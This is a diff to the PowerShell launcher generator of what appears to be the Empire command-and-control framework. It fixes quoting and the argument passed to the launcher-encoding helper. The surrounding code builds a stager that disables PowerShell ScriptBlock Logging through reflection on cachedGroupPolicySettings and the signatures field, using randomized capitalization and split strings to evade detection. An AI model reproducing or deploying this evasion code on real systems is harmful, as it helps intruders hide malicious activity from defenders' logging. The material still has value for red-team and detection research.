@@ -169,7 +169,7 @@ class Listener:
             listener_options = self.mainMenu.listeners.activeListeners[listenerName]['options']
             staging_key = listener_options['StagingKey']['Value']
             profile = listener_options['DefaultProfile']['Value']
-            launcher = listener_options['Launcher']['Value']
+            launcher_cmd = listener_options['Launcher']['Value']
             staging_key = listener_options['StagingKey']['Value']
             poll_interval = listener_options['PollInterval']['Value']
             base_folder = listener_options['BaseFolder']['Value'].strip("/")
@@ -178,7 +178,7 @@ class Listener:
             results_folder = listener_options['ResultsFolder']['Value']
 
             if language.startswith("power"):
-                launcher = '$ErrorActionPreference = \"SilentlyContinue\";' #Set as empty string for debugging
+                launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging
 
                 if safeChecks.lower() == 'true':
                     launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
@@ -186,7 +186,7 @@ class Listener:
                     # ScriptBlock Logging bypass
                     launcher += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                     launcher += "'System.Management.Automation.Utils'"
-                    launcher += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    launcher += helpers.randomize_capitalization(").'GetFie`ld'(")
                     launcher += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
                     launcher += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
                     launcher += "['ScriptB'+'lockLogging']"
@@ -201,7 +201,7 @@ class Listener:
                     launcher += helpers.randomize_capitalization("$GPC")
                     launcher += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
                     launcher += helpers.randomize_capitalization("=$val}")
-                    launcher += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    launcher += helpers.randomize_capitalization("Else{[ScriptBlock].'GetFie`ld'(")
                     launcher += "'signatures','N'+'onPublic,Static'"
                     launcher += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
@@ -262,7 +262,7 @@ class Listener:
                     launcher = helpers.obfuscate(self.mainMenu.installPath, launcher, obfuscationCommand=obfuscationCommand)
 
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
-                    return helpers.powershell_launcher(launcher, launcher)
+                    return helpers.powershell_launcher(launcher, launcher_cmd)
                 else:
                     return launcher
 
